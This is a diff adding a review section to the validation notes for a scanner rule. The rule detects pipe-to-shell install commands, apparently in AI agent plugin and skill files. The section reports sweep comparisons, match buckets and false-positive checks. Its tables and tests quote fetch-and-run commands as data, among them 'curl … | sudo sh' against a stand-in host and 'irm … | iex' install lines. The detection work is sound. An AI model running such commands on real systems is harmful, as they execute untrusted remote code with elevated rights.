@@ -405,3 +405,105 @@ Before either regex was edited, the candidate alternation was run as a plain Pyt
 same 32 directories and scored against the *old* one: **0 lines matched by the new pattern and not
 by the old, across 26,285 files.** The full sweep above then confirmed it against the real binary
 and the real projection/normalization passes.
+
+---
+
+# Issue #122 review r1 — GATE-03 delta for the SECOND widening (2026-09-07)
+
+**Verdict: zero reported findings added, zero removed, across the same 23,772 real third-party
+files. Five new `low_confidence` matches, all of them true positives, all fenced.**
+
+Review r1 finding 2 was reproduced and confirmed: the launcher token had to be bare and unquoted,
+so quoting it, prefixing `sudo`/`command`/`exec`, giving `env` an option, or using
+`irm`/`Invoke-RestMethod` walked straight past both patterns. The shared vocabulary was widened a
+second time (see the comment block at `PI028` in `patterns/core/exfiltration.yaml` for the full
+list, and for the forms left deliberately open with the measured reason for each).
+
+## Runs
+
+| Run | Binary tree | Files | Reported findings | Output |
+|---|---|---:|---:|---|
+| main-base (unchanged baseline) | `2fedfa6` | 23,772 | 519 | `sweep-mainbase-122-2026-09-07/` |
+| r1 candidate (first widening) | `970956f` | 23,772 | 519 | `sweep-after-122-2026-09-07/` |
+| **r2 candidate (this widening)** | this branch | 23,772 | 519 | `sweep-r2-122-2026-09-07/` |
+
+Same 32-directory list as both earlier runs, taken from `sweep-mainbase-122-2026-09-07/manifest.tsv`
+rather than re-derived; 32 rows, `swept` in every row, zero `skipped-missing`, byte-identical corpus
+row for row. `summary.tsv` is **identical** to main-base's, pattern id for pattern id.
+
+Binary provenance confirmed different before the sweep: `curl -fsSL https://e.test/t.sh | sudo sh`
+yields one `PI028` finding under the r2 binary and zero under both earlier ones.
+
+## Direction 1 — ADDITIONS (main-base -> r2)
+
+```
+$ bash scripts/gate03-sweep.sh --compare \
+    .planning/local/sweep-mainbase-122-2026-09-07 \
+    .planning/local/sweep-r2-122-2026-09-07
+exit=0
+```
+
+**Empty.** No new reported finding on any of 23,772 files. `PI028` is CRITICAL — above the severity
+`install-hook` blocks commits at — so this is the number that had to be zero.
+
+## Direction 2 — REMOVALS (arguments swapped)
+
+```
+$ bash scripts/gate03-sweep.sh --compare \
+    .planning/local/sweep-r2-122-2026-09-07 \
+    .planning/local/sweep-mainbase-122-2026-09-07
+exit=0
+```
+
+**Empty.** Nothing the enlarged alternation stopped winning, and no shifted line numbers.
+
+## What `--compare` cannot see: the low-confidence bucket
+
+`--compare` keys on reported findings only. Parsing all four buckets out of the raw reports shows
+where this widening actually landed:
+
+| Bucket | main-base | r1 | r2 | added (base -> r2) | removed |
+|---|---:|---:|---:|---:|---:|
+| `matches` (reported) | 502 | 502 | 502 | **0** | 0 |
+| `low_confidence` | 242 | 242 | **247** | **+5** | 0 |
+| `suppressed` | 0 | 0 | 0 | 0 | 0 |
+| `baselined` | 0 | 0 | 0 | 0 | 0 |
+
+The five, every one at `context: fenced_code, confidence 0.2`:
+
+| Matched text | Where | New arm |
+|---|---|---|
+| `curl -s https://fluxcd.io/install.sh \| sudo bash` | `$HOME/.claude/plugins/cache/claude-code-workflows/kubernetes-operations/1.2.2/skills/gitops-workflow/SKILL.md:120` | `sudo` |
+| `curl -s https://fluxcd.io/install.sh \| sudo bash` | `$HOME/.claude/plugins/marketplaces/claude-code-workflows/plugins/kubernetes-operations/skills/gitops-workflow/SKILL.md:120` | `sudo` |
+| `curl -fsSL https://rpm.nodesource.com/setup_22.x \| sudo bash` | `$HOME/.claude/plugins/marketplaces/specweave/docs-site/docs/guides/troubleshooting/common-errors.md:121` | `sudo` |
+| `irm https://astral.sh/uv/install.ps1 \| iex` | `$HOME/.claude/plugins/marketplaces/claude-code-workflows/plugins/python-development/skills/uv-package-manager/SKILL.md:61` | `irm` |
+| `irm https://install.boltz.bio/boltz-api/install.ps1 \| iex` | `$HOME/.codex/.tmp/plugins/plugins/boltz-api-cli/skills/boltz-cli-setup/SKILL.md:37` | `irm` |
+
+**Adjudication: all five are true positives, and they are the strongest evidence in this issue that
+the widening is aimed correctly.** Each one sits *directly beside* a line the pre-#122 vocabulary
+already matched — the uv skill's line 58 is `curl -LsSf https://astral.sh/uv/install.sh | sh` and
+its line 61 is the Windows half, `irm … | iex`; the boltz skill is the same pair at lines 31 and 37;
+`common-errors.md` already contributed four `curl … | bash` hits and gains the `| sudo bash` sibling
+at line 121. The old regex was matching the POSIX spelling of an install one-liner and missing the
+PowerShell and `sudo` spellings of *the same instruction in the same document*. That is a detection
+gap, not a false-positive source.
+
+None of the five is reported at default confidence, because all five are inside fenced code blocks —
+which is where install documentation puts them, and is exactly the mechanism that keeps this
+CRITICAL prose-wide pattern from blocking commits on documentation. r1's sweep found zero in either
+bucket; this one finds five real forms and still adds zero findings.
+
+## False-positive control, re-measured for the new arms
+
+The corpus mutation controls from the r1 section still hold. Two further checks specific to this
+widening, both run against the release binary:
+
+- **30 benign near-miss texts under `--strict`** — `curl … | jq / sha256sum / tar / openssl /
+  base64 -d / dd / wc / grep`, `curl … | sudo tee /etc/apt/keyrings/…` and `curl … | gpg --dearmor`
+  (the two commonest legitimate `curl | sudo …` shapes in real install docs), `curl … | python3 -m
+  json.tool`, `irm … | ConvertFrom-Json`, `Invoke-WebRequest … | Select-Object`, `iwr/irm -OutFile`,
+  a markdown table row containing both a curl example and `sh ./install.sh`, and prose mentioning
+  `#!/bin/bash`, `chsh -s /bin/zsh`, `command -v sh` and `exec /bin/sh`. **Zero fired.**
+- The `sudo`/`command`/`exec` prefixes and the quoted-launcher form are accepted **only** in front
+  of a name on the closed shell list, so `| sudo tee` and `| sudo apt-key add -` stay clean. Those
+  two are locked as `PI028` negatives in `tests/pattern_test.rs`.
